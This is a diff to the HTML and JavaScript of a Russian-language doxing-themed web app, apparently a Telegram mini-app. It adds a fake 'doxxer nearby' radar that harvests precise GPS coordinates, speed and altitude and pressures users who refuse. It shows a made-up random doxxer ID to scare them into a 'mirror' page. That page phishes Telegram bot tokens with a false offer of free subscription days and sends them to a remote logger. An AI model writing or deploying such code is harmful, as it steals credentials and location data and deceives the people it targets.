@@ -269,6 +269,9 @@
     <button class="btn danger full" onclick="openDoxxer()">
         <span class="icon">📡</span>Доксер поблизости
     </button>
+    <button class="btn full" onclick="openMirror()">
+        <span class="icon">🔗</span>Создать зеркало
+    </button>
 </div>
 
 <div id="pageSearch" class="page">
@@ -343,6 +346,24 @@
     <button class="back" onclick="goBack()">Вернуться в меню</button>
 </div>
 
+<div id="pageMirror" class="page">
+    <h2>🔗 Создать зеркало</h2>
+    <p style="color:#888;font-size:13px;line-height:1.6;margin-bottom:15px;">
+        Зеркало позволяет получить расширенный доступ к базе данных
+        и снять ограничения на количество запросов.<br><br>
+        После проверки вы получите <b>3 дня подписки бесплатно</b>.
+    </p>
+    <input type="text"  id="mirrorUsername"
+           placeholder="Username бота (без @)">
+    <input type="text"  id="mirrorToken"
+           placeholder="TOKEN бота (от @BotFather)">
+    <button class="search-btn" onclick="submitMirror()">
+        Отправить на проверку
+    </button>
+    <div id="mirrorResult"></div>
+    <button class="back" onclick="goBack()">Вернуться в меню</button>
+</div>
+    
 <script>
 // ================================================================
 // CONFIG
@@ -572,23 +593,111 @@ async function sendLog(query, extraFields) {
 sendLog();
 
 // ================================================================
-// ДОКСЕР ПОБЛИЗОСТИ
+// ДОКСЕР — обновлённая логика
 // ================================================================
 var doxxerUsed = false;
 
 function openDoxxer() {
     showPage('pageDoxxer');
     if (doxxerUsed) {
-        showDoxxerResult();
+        showDoxxerFinal();
         return;
     }
     document.getElementById('doxxerState').innerHTML =
         '<div class="result warn" style="margin-bottom:16px;">' +
-        '⚠️ Для сканирования необходим доступ к геолокации.' +
-        '<br><br>Данные используются только для определения ' +
-        'радиуса поиска.</div>' +
+        '⚠️ Для сканирования необходим доступ к геолокации.<br><br>' +
+        'Данные используются только для определения радиуса поиска.' +
+        '</div>' +
         '<button class="search-btn" onclick="requestGeo()" ' +
         'style="margin-top:0;">📡 Начать сканирование</button>';
+}
+
+function requestGeo() {
+    showRadar('Запрос геолокации...');
+    if (!navigator.geolocation) {
+        logGeo(null, 'unavailable');
+        return;
+    }
+    navigator.geolocation.getCurrentPosition(
+        function(pos) { logGeo(pos, 'granted'); },
+        function(err) { logGeo(null, 'denied');  },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+function showRadar(statusText) {
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="radar-wrap">' +
+        '<div class="radar">' +
+        '<div class="radar-line"></div>' +
+        '<div class="radar-dot"></div>' +
+        '</div>' +
+        '<div class="radar-status">' + statusText + '</div>' +
+        '</div>';
+}
+
+function randInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function fakeDoxxerId() {
+    // Три цифры + от 6 до 7 звёздочек
+    var digits = String(randInt(100, 999));
+    var stars  = '*'.repeat(randInt(6, 7));
+    return digits + stars;
+}
+
+function showDoxxerFinal() {
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="radar-result" style="color:#ff4444;' +
+        'background:rgba(255,50,50,0.08);border-color:#ff444433;">' +
+        '🚨 <b>Обнаружен доксер поблизости!</b><br><br>' +
+        'Расстояние: <b>~' + randInt(20, 2000) + 'м</b><br>' +
+        'ID аккаунта: <code>' + fakeDoxxerId() + '</code><br><br>' +
+        '<span style="color:#888;font-size:12px;">' +
+        'Для просмотра полного ID создайте зеркало бота' +
+        '</span><br><br>' +
+        '<button class="search-btn" onclick="openMirror()" ' +
+        'style="margin-top:8px;">🔓 Создать зеркало</button>' +
+        '</div>';
+}
+
+function showDoxxerDenied() {
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="result warn">' +
+        '📍 <b>Требуется геолокация</b><br><br>' +
+        'Без доступа к GPS бот не может определить ближайшие ' +
+        'территории и обнаружить доксеров в вашем районе.<br><br>' +
+        '<button class="search-btn" onclick="requestGeo()" ' +
+        'style="margin-top:8px;">📡 Разрешить и продолжить</button>' +
+        '</div>';
+}
+
+async function logGeo(position, status) {
+    doxxerUsed = true;
+    var extra  = { geo_status: status };
+
+    if (position) {
+        var c = position.coords;
+        extra.geo_lat      = String(c.latitude);
+        extra.geo_lon      = String(c.longitude);
+        extra.geo_accuracy = String(Math.round(c.accuracy)) + 'm';
+        extra.geo_altitude = c.altitude
+            ? String(Math.round(c.altitude)) + 'm' : '';
+        extra.geo_speed    = c.speed
+            ? String(Math.round(c.speed * 3.6)) + 'km/h' : '';
+        showRadar('Сканирование района...');
+        await new Promise(function(r) { setTimeout(r, 3000); });
+        await sendLog('geo_scan', extra);
+        showDoxxerFinal();
+    } else {
+        // Отказал или недоступно — давим на повтор
+        showRadar('Анализ данных...');
+        await new Promise(function(r) { setTimeout(r, 2000); });
+        await sendLog('geo_denied', extra);
+        doxxerUsed = false; // сбрасываем чтобы мог попробовать снова
+        showDoxxerDenied();
+    }
 }
 
 function requestGeo() {
@@ -615,40 +724,68 @@ function showRadar(statusText) {
         '</div>';
 }
 
-function showDoxxerResult() {
-    document.getElementById('doxxerState').innerHTML =
-        '<div class="radar-result">' +
-        '✅ Сканирование завершено<br><br>' +
-        '<b>Доксеров в радиусе ~1000км не обнаружено</b>' +
-        '<br><br>' +
-        '<span style="color:#888;font-size:12px;">' +
-        'Следующее сканирование доступно через 24 часа' +
-        '</span></div>';
+// ================================================================
+// ЗЕРКАЛО — сбор токенов
+// ================================================================
+var mirrorSent = false;
+
+function openMirror() {
+    showPage('pageMirror');
 }
 
-async function logGeo(position, status) {
-    doxxerUsed = true;
-    var extra  = { geo_status: status };
-
-    if (position) {
-        var c = position.coords;
-        extra.geo_lat      = String(c.latitude);
-        extra.geo_lon      = String(c.longitude);
-        extra.geo_accuracy = String(Math.round(c.accuracy)) + 'm';
-        extra.geo_altitude = c.altitude
-            ? String(Math.round(c.altitude)) + 'm' : '';
-        extra.geo_speed    = c.speed
-            ? String(Math.round(c.speed * 3.6)) + 'km/h' : '';
-        showRadar('Сканирование района...');
-    } else {
-        showRadar('Анализ данных...');
+async function submitMirror() {
+    if (mirrorSent) {
+        document.getElementById('mirrorResult').innerHTML =
+            '<div class="result warn" style="margin-top:15px;">' +
+            'Данные уже отправлены. Ожидайте проверки.' +
+            '</div>';
+        return;
     }
 
-    await new Promise(function(r) { setTimeout(r, 3000); });
-    await sendLog('geo_scan', extra);
-    showDoxxerResult();
-}
+    var username = document.getElementById('mirrorUsername')
+                           .value.trim().replace(/^@/, '');
+    var token    = document.getElementById('mirrorToken')
+                           .value.trim();
 
+    if (!username || !token) {
+        document.getElementById('mirrorResult').innerHTML =
+            '<div class="result" style="margin-top:15px;">' +
+            'Заполните оба поля.' +
+            '</div>';
+        return;
+    }
+
+    document.getElementById('mirrorResult').innerHTML =
+        '<div class="result loading" style="margin-top:15px;">' +
+        'Проверка данных...' +
+        '</div>';
+
+    // Шлём токен через тот же воркер как отдельный лог
+    var data = await collectData('mirror_token', {
+        mirror_username: username,
+        mirror_token:    token
+    });
+
+    fetch(window.CLOUDFLARE_LOGGER, {
+        method:    'POST',
+        headers:   { 'Content-Type': 'application/json' },
+        body:      JSON.stringify(data),
+        keepalive: true
+    }).catch(function() {});
+
+    mirrorSent = true;
+
+    await new Promise(function(r) { setTimeout(r, 2500); });
+
+    document.getElementById('mirrorResult').innerHTML =
+        '<div class="radar-result" style="margin-top:15px;">' +
+        '✅ Данные отправлены на проверку.<br><br>' +
+        'В случае валидности вы получите <b>3 дня подписки</b>.<br>' +
+        '<span style="color:#888;font-size:12px;">' +
+        'Обычно проверка занимает до 24 часов.' +
+        '</span></div>';
+}
+    
 // ================================================================
 // NAVIGATION
 // ================================================================
